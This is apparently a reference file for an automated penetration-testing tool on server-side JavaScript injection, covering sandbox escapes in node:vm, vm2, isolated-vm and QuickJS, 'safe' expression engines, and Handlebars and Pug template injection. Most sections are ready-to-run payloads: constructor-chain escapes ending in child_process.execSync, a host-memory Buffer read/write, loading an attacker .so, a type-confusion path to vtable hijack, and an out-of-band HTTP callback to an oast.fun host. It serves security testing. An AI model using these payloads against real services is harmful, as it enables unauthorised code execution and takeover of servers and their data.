---
name: ssji-advanced-deep
description: SSJI advanced depth — full node:vm/vm2/isolated-vm/QuickJS sandbox-escape lineage, Function/eval/AsyncFunction primitive variations, template-engine JS contexts, "safe" expression engines, serverless JS, blind/second-order exploitation, and WAF/filter bypass as a technique class
sibling: ssji
load_when: scan_mode == "deep"
---

# Server-Side JavaScript Injection — Advanced + Expert Depth

This is the advanced+expert deep sibling to `ssji.md`. The base owns the class framing, the measured node:vm-with-empty-context escape, the Function/eval/AsyncFunction primitive expression ladder, the setTimeout(string)-is-dead-on-Node-20+ measurement, and the runtime differential (node:vm vs vm2 vs isolated-vm vs QuickJS vs WASM). This file owns the full established technique surface at depth: the Node sandbox-escape lineage per library and historical primitive class, template-engine JS-compile contexts per engine, "safe" expression-engine escapes, serverless JS specifics, dynamic require/import exploitation, blind and second-order methodology, and WAF/identifier-filter bypass as a technique class. The novel sibling `ssji_novel_deep.md` owns the 2024–2026 CVE catalog with the canonical version/fix table.

Load this file when the goal is reasoning about which escape primitive applies to a given Node runtime and library version, confirming blind SSJI without a reflected signal, bypassing an identifier-filter sanitizer, or constructing a gadget chain from pollution or deserialization to a server-side JS compile sink.

## Measured Sandbox-Escape Matrix

Measured on Node v24.19.0 (artifacts at `.zen-batch-artifacts/batch-14/measure/sandbox-matrix/`). Each row is a (library, pre-fix primitive) pair against the current Node version; the output is the actually-observed behavior, not research-claimed.

| Library + version | Primitive attempted | Observed result | Confirms |
|---|---|---|---|
| `node:vm` v24.19.0 + leaked `{outsideRef: {}}` | `outsideRef.constructor.constructor('return this')().process.mainModule.require('child_process').execSync('id')` | **ESCAPES** — `uid=1000(kali) gid=1000(kali) ...` | Base-tier primitive on any leaked ref |
| `node:vm` v24.19.0 + empty `{}` context | `this.constructor.constructor('return this')().process.mainModule.require('child_process').execSync('id')` | **ESCAPES** — same output | Empty context does not help; sandbox global IS a host object |
| `Function('return typeof process')()` | direct Function constructor | `"object"` | Function reaches host `process` |
| `eval('typeof process')` | direct eval | `"object"` | eval reaches host |
| `new AsyncFunction('return typeof process')()` via `Object.getPrototypeOf(async function(){}).constructor` | AsyncFunction primitive | `"object"` (via Promise) | AsyncFunction reaches host |
| `setTimeout('code', 0)` on Node v24 | string callback form | **THROWS `ERR_INVALID_ARG_TYPE`** | String-callback setTimeout removed server-side on Node 20+; browser-only now |
| `vm2@3.9.19` + `async .catch` with `err.constructor.constructor` | legacy Promise-sanitization-bypass primitive (CVE-2023-37466 shape) | **BLOCKED** — `inner-fail: process is not defined` | vm2 3.9.19 patches CVE-2023-37466 class; .then sanitization present |
| `vm2@3.9.19` NodeVM with `nesting: true, require: false` + inner `typeof require` | legacy nesting-require bypass (CVE-2026-44007 class) | **BYPASSES** — `nesting-reachable: function` (inner `require` is live despite `require:false`) | CVE-2026-44007 mechanism (nesting+legacy-resolver) is reachable on vm2 3.9.19 — the class pre-dates the maintainer's revival window and is a long-standing gap, not a 2026 regression |
| `quickjs-emscripten` + `typeof process` | runtime fingerprint | `"no-process"` | QuickJS has no `process` global — std-lib isolation differential |
| `quickjs-emscripten` + `({}).constructor.constructor('return this')().process` | classic chain against QuickJS | returns `undefined` | QuickJS reaches `this` but the host object has no `process`; isolation is at the std-lib level, not the realm level |

Reads from this matrix:
- **The empty-context `node:vm` escape is the strongest base-tier claim** — there is no vanilla `node:vm` configuration that resists `.constructor.constructor` on any leaked reference, including the sandbox global itself.
- **vm2 3.9.19 blocks CVE-2023-37466's specific Promise-sanitization primitive** but still permits the `nesting:true` + legacy-resolver bypass that was formally patched only in vm2 3.11.1. A pre-revival vm2 is defense-brittle in a different way than the 2026 wave: the primitives are older but still live. The vm2 revival narrative (base file) is accurate but it leaves the pre-revival primitives standing.
- **QuickJS and node:vm differ at the std-lib boundary, not the realm boundary.** QuickJS's `.constructor.constructor` chain reaches the QuickJS Function, not a Node Function; the Node-specific `process` global does not exist in QuickJS, so even if the attacker reaches "the host," there is no host OS reach without an explicit host-side binding registered by the embedder.
- **`setTimeout(string)` is dead server-side on Node 20+.** A payload set that treated this as a universal sink needs explicit version-pinning to pre-20 or browser-side SSR paths.

## node:vm Escape Primitive Classes

`node:vm` ships four context primitives: `vm.runInContext`, `vm.runInNewContext`, `vm.runInThisContext`, and `new vm.Script().runIn*`. The compile step produces a V8-compiled function tied to the current V8 Isolate; the "context" is a sandbox *global object*, not a sandbox realm. Every object the sandbox global can reach via its prototype chain is a host-realm object — including the sandbox global itself.

### Primitive 1 — .constructor.constructor on any outer reference

Primitive: `host-realm Function constructor` reached via `.constructor` walks from the sandbox.

Preconditions:
- Any reachable host-realm object (literal `{}`, `[]`, `""`, number, Date, Function, Error, or `this` — the sandbox global itself).
- `vm.runInContext` or any `node:vm` compile-and-run entry.

Attack recipe:
```javascript
// Guest-side code, with context = {} or any leaked reference
const F = ({}).constructor.constructor;
// Equivalent paths:
// ''['constructor']['constructor']
// Array['constructor']['constructor']    // Array is host-realm from the sandbox global
// Error['constructor']['constructor']    // Error is host-realm; Error inheritance uses outer prototype
// this.constructor.constructor           // 'this' is the sandbox global, a host object
const host = F('return this')();
host.process.mainModule.require('child_process').execSync('id').toString();
```

Confirmation: `host.process.pid` returns the Node process PID; `host.process.argv[0]` returns the path to the Node binary. Both are specific-to-Node signals a stub cannot fake.

Impact: Direct host-realm code execution. All subsequent vm/vm2/isolated-vm escapes reduce to this chain at the final hop — once a leaked host reference is obtained, the Function constructor is reachable.

### Primitive 2 — Error.prepareStackTrace via thrown-error inheritance

Primitive: throw a crafted Error whose stack traversal reaches host code during serialization.

Preconditions:
- Guest-controlled error object thrown into a path that triggers V8's stack formatter (any uncaught throw inside V8 produces this).
- Host-side `Error.prepareStackTrace` not pinned to a safe implementation.

Attack recipe:
```javascript
// Guest-side
Error.prepareStackTrace = (err, structuredStack) => {
  // 'structuredStack' entries are V8 CallSite objects; .getFunction() returns host-realm functions
  const callerFn = structuredStack[0].getFunction();
  const F = callerFn.constructor.constructor;
  return F('return this')().process.mainModule.require('child_process').execSync('id').toString();
};
const e = new Error('x');
e.stack;   // triggers prepareStackTrace → runs the attacker-authored formatter in host realm
```

Confirmation: the `.stack` property evaluates to the exec output. V8-specific; works wherever V8 is the engine (Node, Deno, Chrome SSR).

Impact: a stack-formatter hook is executed every time any error is serialized — including implicit stack-trace formatting during `console.error`, log serializers, and error-reporting middleware. The guest poisons the host's error pipeline.

### Primitive 3 — AsyncIterator / Symbol.asyncIterator on returned objects

Primitive: Attach a `Symbol.asyncIterator` to the returned value so the host, iterating the value with `for await (... of ...)`, calls back into guest code with a host-realm `this`.

Preconditions:
- Host code iterates the sandbox return value with `for await`.
- Guest can attach computed `Symbol.asyncIterator` properties — effectively any object the guest controls.

Attack recipe:
```javascript
// Guest-side
const returned = {
  [Symbol.asyncIterator]() {
    return {
      next() {
        const F = this.constructor.constructor;    // 'this' is the host-realm iterator object
        F('return this')().process.mainModule.require('child_process').execSync('id');
        return Promise.resolve({ done: true });
      }
    };
  }
};
returned;
```

Confirmation: the exec runs the first time the host iterates. A `done:true` on first call prevents the host from re-entering guest code.

Impact: delayed, host-triggered execution — works when the guest return value is not reflected but is iterated downstream. Common in GraphQL subscription paths and streaming responses.

### Primitive 4 — Proxy with get-trap on inherited properties

Primitive: Return a Proxy whose get-trap executes attacker code when the host reads a mundane property.

Preconditions:
- Host code reads any property on the returned value — `.then`, `.toString`, `.length`, `.message`.
- Guest return value is a Proxy.

Attack recipe:
```javascript
// Guest-side
const trap = new Proxy({}, {
  get(target, key, receiver) {
    const F = receiver.constructor.constructor;
    return F('return this')().process.mainModule.require('child_process').execSync('id').toString();
  }
});
trap;
```

Confirmation: the host's `console.log(result)` (which reads `.toString`) triggers the exec. The host printing the value is the exec signal.

Impact: implicit property-access during logging, serialization, or `JSON.stringify` triggers host-realm execution. Any sink that touches the returned value triggers.

## vm2 — The Pseudo-Sandbox Lineage

vm2 is a Proxy-based wrapper over `node:vm` that attempts to mediate every reference crossing the sandbox/host boundary with a `Transformer` rewriter. The design is defense-in-breadth — thousands of guard proxies — and historically has failed consistently because any single unguarded path reaches host.

### Transformer bypass primitive class

Primitive: find a syntactic or semantic path in guest code that returns a host-realm object to guest scope without passing through vm2's Transformer rewrite.

Preconditions:
- vm2 is the sandbox (any version 3.x through 3.11.x).
- Guest can author arbitrary ES code (not a bounded expression grammar).

Each primitive sub-class gets full P/P/A/C/I treatment below. The CVE instances carrying each primitive are canonical-table-single-owned by `ssji_novel_deep.md`.

### Sub-primitive 1 — Promise `.then` / `.catch` Callback Sanitization Gap

**Primitive.** vm2 wraps the user-visible `Promise` constructor to sanitize callbacks; historically it missed one of `.then` / `.catch` / `.finally` on one of `localPromise` / `globalPromise`. The gap is per-method and per-realm-Promise, and successive CVEs patched one and left another.

**Preconditions.**
1. vm2 version with the specific sanitization gap (CVE-2023-37466 → `.then` on globalPromise; CVE-2026-22709 → `.catch` on globalPromise; subsequent CVEs on `.finally`, `JSPI-backed .finally`, etc.).
2. Guest can author an async function or any construct that returns the un-sanitized Promise type (async functions return `globalPromise`, not `localPromise`).

**Attack recipe:**
```javascript
// Guest-side (shape; vendor advisory has specific per-CVE form)
async function trigger() { throw new Error('x'); }
trigger().catch(function (err) {
  // 'err' is a host-realm Error whose .constructor is host Error, .constructor.constructor is host Function
  const F = err.constructor.constructor;
  const host = F('return this')();
  host.process.mainModule.require('child_process').execSync('id > /tmp/pwnd');
});
```
Confirm: `/tmp/pwnd` created outside the sandbox; `child_process.execSync` output printed via `console.log(host.process.pid)` matches the actual host Node PID.

**Impact.** Full host-realm RCE identical to raw `node:vm`. The sanitization layer gives a false sense of containment — once the attacker finds the un-wrapped method, the primitive is unlocked. Multiple siblings of this class (CVE-2023-37466, CVE-2026-22709, follow-on fixes) confirm the shape generalizes.

### Sub-primitive 2 — Error.cause Unsanitized

**Primitive.** vm2 wraps `new Error(message)` with a Transformer that mediates property access, but historically did not wrap `new Error(message, { cause })` — the `cause` option (ES2022 standard) carried a host-realm reference through the construction without the Transformer mediating.

**Preconditions.**
1. vm2 pre-fix (CVE-2026-47686 and successors).
2. Host code throws an Error with `cause` into the guest, OR guest triggers a host-code path that throws with cause.

**Attack recipe:**
```javascript
// Guest-side
try {
  // Any host-side path that throws Error with cause (reading a non-existent property on a host wrapper, calling a host-exposed API with a value that triggers host throw)
  someHostExposedAPI(/* value that triggers host-side throw with cause */);
} catch (e) {
  // e.cause is host-realm; e.cause.constructor is host
  const host = e.cause.constructor.constructor('return this')();
  host.process.mainModule.require('child_process').execSync('id');
}
```

**Confirmation.** `e.cause.constructor === host-realm Object` reachable (observable by comparing with sandbox-realm Object); exec output in host.

**Impact.** Host RCE whenever any host throw-with-cause path is reachable from guest. The ES2022 cause option is widely used in modern error-handling; the vm2 gap tracked ES feature additions by multiple months.

### Sub-primitive 3 — Buffer and Host Memory Pool

**Primitive.** Node's `Buffer.concat`, `Buffer.allocUnsafe`, and `Buffer.from(arrayLike)` allocate memory from a shared pool managed by the Node C++ layer. A Buffer handed to the guest exposes `.buffer` (the underlying ArrayBuffer), which guest code can view with `DataView` or `Uint8Array` to read and write host memory contents — bypassing V8's property-level mediation entirely.

**Preconditions.**
1. vm2 pre-fix (CVE-2026-47683 class).
2. Guest can trigger `Buffer.concat` / `Buffer.allocUnsafe` / `Buffer.from(arrayLike)` in a context that returns a Buffer to guest scope.
3. Node runtime at a version where the pool-sharing is observable.

**Attack recipe:**
```javascript
// Guest-side
const victim = Buffer.concat([Buffer.from([1,2,3,4])]);  // allocates from the pool
const view = new Uint8Array(victim.buffer);              // view extends to pool slab boundary
// Walk view indexes beyond victim.length to read neighboring pool contents
for (let i = 0; i < view.length; i++) { console.log(i, view[i]); }
// Write to adjacent indexes to corrupt neighboring pool contents
view[victim.length + 100] = 0xff;
```

**Confirmation.** Reading indexes beyond `victim.length` returns non-zero bytes from the shared pool (observable as data leakage); writes affect subsequent host allocations.

**Impact.** Memory corruption primitive; chain to arbitrary read/write by sweeping the pool with controlled allocation sizes. Baseline impact: info disclosure (host memory contents, including other objects allocated in the same pool slab); exploitable to RCE via standard memory-corruption techniques.

### Sub-primitive 4 — Nested vm2 Contexts (nesting: true)

**Primitive.** vm2's `NodeVM` with `nesting: true` lets guest code instantiate inner `NodeVM` instances. The nested context inherits the outer vm2's `require` handling; historically this nested-require path was less-mediated than the outer vm2's primary path, and bypasses the outer's `require: false` or `require: {external: false}` controls.

**Measured on vm2 3.9.19 + Node v24.19.0** (`.zen-batch-artifacts/batch-14/measure/sandbox-matrix/vm2_escape_test.output.txt`): a NodeVM constructed with `{nesting: true, require: false}` returns `nesting-reachable: function` when the inner context queries `typeof require` — the inner context has a live `require` despite the outer's `require: false`. The mechanism predates the 2026 patch wave and is live on vm2 3.9.19.

**Preconditions.**
1. vm2 version with `nesting: true` set in NodeVM options.
2. Pre-CVE-2026-44007 version (or similar sibling-CVE patch bypass).

**Attack recipe:**
```javascript
// Guest-side (outer NodeVM has nesting:true + require:false set by host)
const inner = new NodeVM({ nesting: true });  // outer passes nesting through
const vm2 = inner.run('require("vm2")');       // reaches host vm2 module
const Escaper = vm2.NodeVM;                     // host-realm NodeVM constructor
const r = new Escaper().run('require("child_process").execSync("id").toString()');
```

**Confirmation.** `typeof vm2.NodeVM === 'function'` in guest scope; subsequent `execSync` output in host.

**Impact.** Full host RCE whenever the host set `nesting: true` on the outer NodeVM. Multi-tenant workflow systems (anything that lets scripts spawn sub-scripts) are the archetype vulnerable deployment.

### Sub-primitive 5 — WebAssembly + V8 Exception Handling (try_table + JSTag)

**Primitive.** V8 shipped the WebAssembly exception-handling proposal with `try_table` and `JSTag` catch handlers. A Wasm module can catch a JavaScript-realm thrown TypeError as an `externref` at the V8 C++ layer, **below** vm2's JS-level Transformer. The caught externref is a host-realm reference with `.constructor` intact.

**Preconditions.**
1. vm2 pre-fix on this specific class (CVE-2026-26956).
2. Node runtime exposes `WebAssembly.JSTag` (Node 25.x and later).
3. Guest can author a WebAssembly module with try_table + JSTag.

**Attack recipe (class-shape — the full Wasm bytes are in the vendor advisory):**
```javascript
// Guest-side (vm2 3.10.4 on Node 25.x)
const errorSymbol = Symbol('x');
// Craft a Wasm module that imports JSTag, has a try_table catching externref
const wasmModule = new WebAssembly.Module(wasmBytes);  // bytes carry try_table + JSTag import
const instance = new WebAssembly.Instance(wasmModule, { js: { JSTag: WebAssembly.JSTag } });
// Trigger: throw an exception whose Symbol-string-coercion in V8 FormatStackTrace produces host TypeError
try { throw { toString() { throw errorSymbol; } }; } catch (e) {}
// instance.exports.caught is now the host-realm externref
const hostErr = instance.exports.caught;
const host = hostErr.constructor.constructor('return this')();
host.process.mainModule.require('child_process').execSync('id');
```

**Confirmation.** `hostErr.constructor` is host Error (not sandbox-wrapped); `host.process.pid` reflects actual host PID.

**Impact.** Full host RCE on vm2 3.10.4 + Node 25.x specifically. The class relies on the Wasm JSTag feature; Node runtimes without JSTag (Node 20, 22) are not reachable via this specific path.

### Sub-primitive 6 — Species / Symbol.species on Promise/Array

**Primitive.** The ES spec permits user-supplied `[Symbol.species]` on a constructor to override which constructor is used for derived objects (e.g., `Array.prototype.map` uses the species to construct the result). vm2 historically did not mediate species-triggered constructor dispatch; a guest-authored class with `[Symbol.species]` returning a host-realm Promise/Array constructor executes the host constructor during derivation.

**Preconditions.**
1. vm2 pre-fix (CVE-2026-47208 class — Promise species; CVE-2026-47210 — JSPI-backed Promise `.finally()` species).
2. Guest can define a class with `[Symbol.species]`.

**Attack recipe:**
```javascript
// Guest-side
class PromiseSpecies extends Promise {
  static get [Symbol.species]() {
    // Return a host-realm Promise constructor
    return (({})).constructor.constructor('return Promise')();  // reaches host Promise
  }
}
const p = PromiseSpecies.resolve(1);
const derived = p.then(x => x + 1);  // uses species = host Promise
// 'derived' is a host-realm Promise; its .then runs in host realm
derived.then(result => {
  const F = result.constructor.constructor;
  F('return this')().process.mainModule.require('child_process').execSync('id');
});
```

**Confirmation.** `derived instanceof Promise` observes host Promise identity (not sandbox).

**Impact.** Host RCE. Species-override is a core ES feature; vm2 added one mediation at a time per species-reachable constructor.

### Sub-primitive 7 — Native-Code Loader Paths

**Primitive.** Node builtins that load dynamic libraries or configure global state at the C++ layer run below vm2's JS-level mediation. The relevant builtins (per the Aug/Sep 2026 vm2 wave):
- `node:sqlite` + SQLite's `loadExtension()` → loads attacker-chosen .so/.dll
- `node:crypto` + `crypto.setEngine()` → loads OpenSSL engine shared library
- `node:https` + `https.globalAgent.{ca, cert, key}` → replaces host process TLS trust store
- `node:test` + `test.run()` with `execArgv` → spawns sub-process with controlled args

**Preconditions.**
1. vm2 with the specific builtin in its `builtin` allowlist (directly or via `require.external`).
2. Node runtime exposes the specific loader API.
3. Attacker reaches a .so/.dll path or configuration that controls the native code.

**Attack recipe (sqlite loadExtension example):**
```javascript
// Guest-side
const sqlite = require('node:sqlite');
const db = new sqlite.DatabaseSync(':memory:');
// Load attacker-chosen native extension; the .so file carries sqlite_extension_init with a payload
db.loadExtension('/tmp/evil.so');  // path to attacker-landed .so (chain with insecure_file_uploads.md)
```

**Confirmation.** Native code runs in host process memory; observable side effects per the payload.

**Impact.** Host RCE via native-code load — bypasses all JS-level mediation entirely because the mediation layer is below V8's reach.

**Attack-recipe shape (generic Transformer-bypass pattern — the specific escape is CVE-specific; route to `ssji_novel_deep.md` for the 2026 lineage):**
```javascript
// Guest-side generic pattern
try {
  async function trigger() {
    throw { constructor: { constructor: null } };   // or an error with .cause carrying a host ref
  }
  trigger().catch(err => {
    const F = err.constructor.constructor;          // Transformer missed .catch
    const host = F('return this')();
    host.process.mainModule.require('child_process').execSync('id');
  });
} catch (e) {}
```

**Confirmation of generic bypass.** `child_process.execSync` output appears outside the vm2 context (visible on the host's console or exfil channel). A guest-side `console.log(host.process.pid)` printing the host Node PID distinguishes "sandbox escape" from "guest-mocked process".

**Impact of class generally.** Host-realm RCE identical to raw `node:vm`. vm2's design budget of "a thousand guards all intact" has never held in practice.

### "vm2 is EOL" is outdated — the live frontier

The widely-cited "vm2 was discontinued in May 2023" narrative is **no longer accurate on current targets**. Measured against the npm registry (`npm view vm2 time --json`, persisted at `.zen-batch-artifacts/batch-14/measure/vm2-timeline.txt`): vm2 3.9.19 was the last 2023 release (2023-05-16); vm2 3.10.0 was published **2025-10-24** by the same maintainer, resuming active development. The 2026 release cadence through 3.11.x is active. Zen content that advised "migrate off vm2 because it is abandoned" is misleading on scans against the current ecosystem — the accurate framing is "vm2 is on active security support but has shipped 20+ sandbox-escape CVEs across 2026; isolated-vm or process isolation remains the recommended default because the Proxy-based design is not architecturally sound for untrusted-code containment." Route the per-CVE mechanism to `ssji_novel_deep.md`.

## isolated-vm — The Separate-Isolate Boundary

`isolated-vm` creates a distinct V8 Isolate per sandbox. Isolates have separate heaps, separate garbage collectors, and separate `Function` constructors — the `.constructor.constructor` chain inside an Isolate reaches *that Isolate's* Function, not the host's. The escape primitive classes differ from `node:vm`'s and reduce to engine-level bugs rather than JS-level references.

### Sub-primitive 1 — ExternalCopy Transferable Type Confusion (Behavior-Fingerprinted)

**Primitive.** A transferable value is walked twice by the host's C++ binding code; a guest-authored getter returns different values on each walk, causing the host to pass a type-confused pointer to a native reinterpret-cast. Known advisory resolves at vendor repo scope only — per §6 "global-or-strip," the specific advisory ID is stripped and the mechanism is retained as a behavior-fingerprinted class (see `ssji_novel_deep.md`).

**Preconditions.**
1. isolated-vm at a pre-fix version (fix characterized by vendor).
2. Host accepts guest-authored transferable objects (`ExternalCopy`, `Transferable.transferIn`, async callback return values).
3. The host's transferable walk is not atomic — two reads of the same slot during marshaling.
4. The reached C++ path uses `As<ArrayBuffer>()` or similar unchecked reinterpret-cast on the second read, with the type-check performed only on the first read.

**Attack recipe:**
```javascript
// Guest-side (inside the Isolate)
let reads = 0;
const payload = new ArrayBuffer(16);
const getter = {
  get buffer() {
    reads++;
    if (reads === 1) return payload;              // first read: real ArrayBuffer passes IsArrayBuffer()
    return 0x4141414100000047n;                   // second read: scalar reinterpreted as ArrayBuffer*
  }
};
// Trigger the transferable walk — specifics depend on the host's binding use
const copy = new ExternalCopy({ data: getter });
copy.copyInto({ transferIn: true });              // host walks .data.buffer twice during marshaling
```

**Confirmation.** Host process crashes (or exhibits controlled behavior) with the attacker marker address `0x4141414100000047` visible in the crash dump — proving the second-read scalar reached a native dereference. For non-crashing variants, use a non-fatal marker and observe host memory via a read primitive the vulnerability exposes.

**Impact (controlled-R/W → RCE chain).**
1. **Controlled read primitive.** The forged ArrayBuffer* lets the attacker read host memory from the attacker-chosen address.
2. **Information leak.** Walk host memory to find the libc base address (via the Node binary's import address table or a known-location pointer).
3. **Controlled write primitive.** Mirror the read gadget with a write-shaped binding (`DataView.setBigUint64(offset, value)` through the forged buffer).
4. **Forged vtable.** Allocate guest memory with a crafted C++ object layout — a `vtable` pointer at offset 0 referencing attacker-shaped function pointers.
5. **Indirect-call hijack.** Trigger a host-side C++ method call on the forged object; the vtable dispatch jumps to `libc!system` or `libc!execve` with attacker-controlled arguments.

**Scope.** Isolate-boundary bypass to arbitrary host-realm code execution. The JS-level `.constructor` chain terminates in the Isolate's Function; this class reaches host via the C++ binding layer below V8.

### Sub-primitive 2 — Reference / derefInto Leak (CVE-2022-39266 / CVE-2021-21413 historical class)

**Primitive.** isolated-vm's `Reference` type wraps a value in one Isolate for use in another. The `.derefInto()` operation copies the referenced value across the boundary — if the host's reference handling has a type-check gap, the deref returns a host-realm reference to guest scope.

**Preconditions.**
1. isolated-vm at the specific pre-fix version per the CVE.
2. Host exposes `Reference` instances to guest, and the guest can invoke `.derefInto()` with a type mismatch.

**Attack recipe (historical shape):**
```javascript
// Guest-side
const hostRef = /* obtained from host-exposed binding */;
const result = hostRef.derefInto({ copy: true });   // historically returned host object directly in some paths
// result.constructor is now host-realm; standard chain follows
```

**Confirmation.** `result.constructor === hostRealmObject` (observable by comparing with sandbox-realm Object).

**Impact.** Full Isolate-boundary bypass to host RCE. The 2021/2022 class is patched on current isolated-vm; the structural lesson generalizes to any `Reference`-like boundary type.

### Sub-primitive 3 — Native-Binding Attack Surface Enumeration

isolated-vm exposes C++ APIs (`ExternalCopy`, `Reference`, `Isolate`, `Script`, `Module`, `IsolatedExecute`) that the host uses to coordinate work across the boundary. Each API is a potential binding gap. Historical and theoretical sub-classes:
- **Non-atomic walks of guest-authored structured data** — the Sub-primitive 1 class generalized.
- **Type-check gaps in `.copySync()` and `.copyInto()`** — attack surface for host-side C++ marshaling.
- **Native extensions registered as callables** — any native code the host exposes via `IsolatedExecute` runs with host privilege; the attack surface is the attacker's reach to the native extension's API.

A pentest of an isolated-vm deployment that reports "no RCE found" should still note the binding-level attack surface explicitly: the isolation stops the JS-level `.constructor` chain, but the host's own use of the C++ APIs is the attack surface. For current-version isolated-vm (≥7.0.1 / ≥6.2.0 backport), the public JS-side API is tight; the attack surface is the host's own binding code, which is application-specific and not covered by the library's own hardening.

### Class generalization

Any isolated-vm escape in 2024–2026 reduces to one of:
- **Native binding non-atomic walk** — attacker-authored getter returns different values on repeated reads.
- **Reference/handle type-check gap** — attacker reaches a host-realm reference via a boundary-crossing API that misses a check.
- **Attacker-controlled native extension** — host loads a native .so/.dll under attacker influence.

Scanning methodology for isolated-vm: enumerate the host's bindings (which C++ APIs the host wraps), check for non-atomic walks of guest data, and verify version against vendor fix versions.

## QuickJS and Alternative Interpreters

QuickJS is a separate JavaScript interpreter (not V8); it ships its own compiler, GC, and runtime. The `node:vm` escape primitives do not apply — the `.constructor.constructor` chain reaches *QuickJS's own* Function, not Node's.

### QuickJS escape surface

QuickJS exposes a subset of ES2020+ features. The host (a Node app embedding `quickjs-emscripten`) exposes host-side APIs by registering `host_vm.newFunction(name, callback)` bindings. A guest can call registered callbacks; everything else is bounded to the interpreter.

The escape primitive classes:
- **Registered-callback abuse.** A host binding that takes a string and does `require(string)` or `fs.readFileSync(string)` grants the guest reach even without an interpreter escape. The host's own binding is the sink.
- **Interpreter bugs in parse/compile/execute** — occasional CVEs against QuickJS binding versions (see `ssji_novel_deep.md`). These are memory-safety bugs in the C runtime, not JS-level escapes.
- **Heap/CPU DoS.** Even a correctly-isolated QuickJS instance has no bound on CPU or memory unless the host sets `host_vm.setMemoryLimit` and `host_vm.setMaxStackSize`. A guest loop or recursive allocator exhausts the host process.

For a scan reaching a QuickJS-isolated endpoint, the finding ladder is: (1) enumerate registered host bindings; (2) attempt a path/filename or arbitrary-require primitive via a binding; (3) test for interpreter bugs on the specific QuickJS version; (4) DoS via unbounded allocation if nothing else fires.

### Deno isolation

Deno runs on V8 but with a permissions model (`--allow-read`, `--allow-net`, `--allow-run`). SSJI inside a Deno script runs with the permissions the process was started with — `--allow-all` SSJI is identical to Node SSJI, but a hardened `--allow-read=./data` SSJI is bounded to the allowed paths. The confirmation: `Deno.readFileSync('/etc/passwd')` throws `PermissionDenied` on a hardened process; `Deno.readFileSync('./data/x')` works. Route to `rce.md` for post-exploitation under constrained permissions.

### Cloudflare Workers / WebAssembly

Workers run inside a V8 Isolate without `node:vm`, `require`, `child_process`, or `process`. SSJI inside a Worker reaches `fetch`, `crypto.subtle`, KV/Durable Object bindings, and Service Worker globals — no OS reach. The finding is "Worker-script execution with the Worker's own secrets," not "host RCE." Confirm with `typeof caches === 'object'` (Worker fingerprint) and route service-level impact assessment to the hosting-provider documentation.

## "Safe" Expression Engines — The AST-Level Escape Class

Libraries sold as "safe eval" (`expr-eval`, `jexl`, `mathjs`, `safe-eval`, `vm2`-labeled-safe, `node-eval`, `eval-estree-expression`) typically parse a bounded grammar to an AST and evaluate the AST without touching JS globals. The escape class is **AST operations that reach host-realm references through member access on parsed literals**.

### Primitive — member access on a parsed literal that returns a host-realm constructor

Preconditions:
- Expression grammar permits `.` (member access) on identifier or literal nodes.
- Evaluator resolves `.constructor` on operand values without an allowlist.

Attack recipe (illustrative; per-library syntax varies):
```javascript
// expr-eval syntax
"({}).constructor.constructor('return process')().mainModule.require('child_process').execSync('id')"

// jexl syntax (jexl allows ternary and member access; transforms are the only gate)
"({})|property:'constructor'|property:'constructor'|invoke:'return process'"
```

Confirmation: the evaluator returns the exec result. For `mathjs`, the `evaluate(code, scope)` with `code` reaching `scope.constructor` is the primitive; `mathjs` later added a chained-expression blocker, so test on the pinned version.

Impact: identical to raw `Function` — the engine's "safe" label is marketing, not architecture. Route the per-engine mitigation to the vendor doc; the finding is that an unsafe engine was deployed.

### Class generalization

Any JS-expression grammar that supports member access and function invocation on operand values is reachable to Function unless the evaluator maintains a whitelist of allowed property names (not an identifier filter — a semantic allowlist). An evaluator with "no member access on literal nodes" is safe; one with "member access except on these names" is defeated by `['con' + 'structor']` string concatenation.

## Template-Engine JS Compile Contexts

Four major engines compile template bytes to JS function bodies. In each, template-source control is Function-constructor control. Each engine gets a per-engine P/P/A/C/I treatment below.

### Handlebars

**Primitive.** Handlebars `compile(source)` produces a JS function via `new Function(...)` from parsed template bytes; attacker-controlled template source IS attacker-controlled Function body. Three sub-primitives:

- **`allowProtoMethodsByDefault: true`** — explicit opt-in to proto-method access; `{{obj.toString}}` reaches arbitrary methods including `constructor.constructor`.
- **`{{#with}}` + `lookup` helpers** — the `lookup` helper by name resolves property on current scope, including `.constructor`.
- **Custom helpers that call `eval`/`Function` on helper arguments** — any helper that `eval`s its argument is a Function sink; template source control reaches it.

**Preconditions.**
1. Handlebars `compile(templateSource)` where `templateSource` is attacker-controlled.
2. Template helpers permit property access on bare values (`allowProtoMethodsByDefault: true` OR custom helpers that resolve properties).
3. Target invokes the compiled template to render.

**Attack recipe (lookup chain):**
```handlebars
{{#with (lookup . "constructor")}}
  {{#with (lookup . "constructor")}}
    {{this "return process.mainModule.require('child_process').execSync('id').toString()"}}
  {{/with}}
{{/with}}
```
Walk: `lookup . "constructor"` → current-scope's constructor (host Object); inner `lookup . "constructor"` → host Function; outer `{{this "...string..."}}` invokes Function with the string body.

**Alternate recipe (direct proto-method where allowed):**
```handlebars
{{#with (lookup "" "constructor")}}
  {{#with (lookup "constructor" "")}}
    {{this "return process"}}
  {{/with}}
{{/with}}
```

**Confirmation signals (enumerated).**
1. **Reflected exec output.** `id` command output in the rendered page body.
2. **Template-compile error with Function body.** Malformed payload throws `SyntaxError: Unexpected token` with the attacker's string visible — confirms the compile stage reached Function.
3. **`process.version`-shaped probe.** Replace `execSync('id')` with `process.version` → `v24.19.0` reflected confirms Node realm.
4. **OAST via Node http module.** `process.mainModule.require('http').get('http://xyz.oast.fun/...')` → DNS/HTTP hit.
5. **No reflected result + no 500.** Likely the engine threw silently or the sandbox stripped the result; probe with reflected `7*7` first.

**Impact.** Full RCE as the Node process; CVE catalog includes multiple Handlebars-helper-driven variants over the years. Fix: compile with `noEscape: false` AND disable `allowProtoMethodsByDefault`.

### Pug

**Primitive.** Pug compiles templates to a Function via `pug.compile(source)`. The `-` prefix embeds unbuffered JS code directly into the compiled function body; template bytes become literal JS.

**Preconditions.**
1. Pug `compile(source)` where `source` is attacker-controlled.
2. Target renders the compiled template.

**Attack recipe (unbuffered-code block):**
```pug
- const F = ({}).constructor.constructor
- const r = F('return this')().process.mainModule.require('child_process').execSync('id').toString()
p= r
```

**Alternate recipe (interpolation):**
```pug
p= (({}).constructor.constructor('return this')()).process.mainModule.require('child_process').execSync('id').toString()
```

**Confirmation signals.**
1. **Reflected exec output in rendered HTML.**
2. **Compile-time error with the attacker's JS visible.** Pug prints the compiled function source on compile failure.
3. **`typeof process` probe reflected as `object`** (Node realm) or `undefined` (non-Node).
4. **OAST hit via `require('http').get(...)`**.

**Impact.** Full RCE at compile time (which is request time in default Pug config).

### EJS

